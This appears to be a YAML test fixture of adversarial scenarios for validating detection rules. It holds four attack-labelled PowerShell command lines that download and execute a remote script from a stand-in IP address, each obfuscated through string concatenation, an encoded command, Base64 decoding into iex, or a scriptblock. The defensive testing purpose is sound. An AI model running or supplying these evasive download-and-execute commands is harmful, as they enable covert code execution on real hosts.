# FROZEN previously-unseen adversarial variants (obfuscation, encoding, fragmentation) plus their benign look-alikes.
# Written without consulting rules; do not edit (see validation/FROZEN.json).
scenarios:
- id: ADV-001
  name: download method name held in a variable
  techniques:
  - T1059.001
  tactic: TA0002
  family: powershell
  label: attack
  events:
  - title: Process creation
    event_type: process.start
    asset_name: srv-hr-04
    process_name: powershell.exe
    command_line: powershell -c "$a='Down'+'loadString'; (New-Object Net.WebClient).$a('http://203.0.113.5/x') | & ('i'+'ex')"
- id: ADV-002
  name: mixed-case encoded command switch
  techniques:
  - T1027
  tactic: TA0005
  family: powershell
  label: attack
  events:
  - title: Process creation
    event_type: process.start
    asset_name: srv-hr-04
    process_name: powershell.exe
    command_line: powershell -w hidden -EnCoDeD SQBFAFgAIAAoAGkAdwByACAAaAB0AHQAcAA6AC8ALwAyADAAMwAuADAALgAxADEAMwAuADUALwB4ACkA
- id: ADV-003
  name: FromBase64String into iex through a variable
  techniques:
  - T1027
  tactic: TA0005
  family: powershell
  label: attack
  events:
  - title: Process creation
    event_type: process.start
    asset_name: srv-hr-04
    process_name: powershell.exe
    command_line: powershell -nop -c "$e=[System.Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBFAFgAIAAoAGkAdwByACAAaAB0AHQAcAA6AC8ALwAyADAAMwAuADAALgAxADEAMwAuADUALwB4ACkA'));iex $e"
- id: ADV-004
  name: scriptblock created from a downloaded string
  techniques:
  - T1059.001
  tactic: TA0002
  family: powershell
  label: attack
  events:
  - title: Process creation
    event_type: process.start
    asset_name: srv-hr-04
    process_name: powershell.exe
    command_line: powershell -nop -c "& ([scriptblock]::Create((irm http://203.0.113.5/x)))"
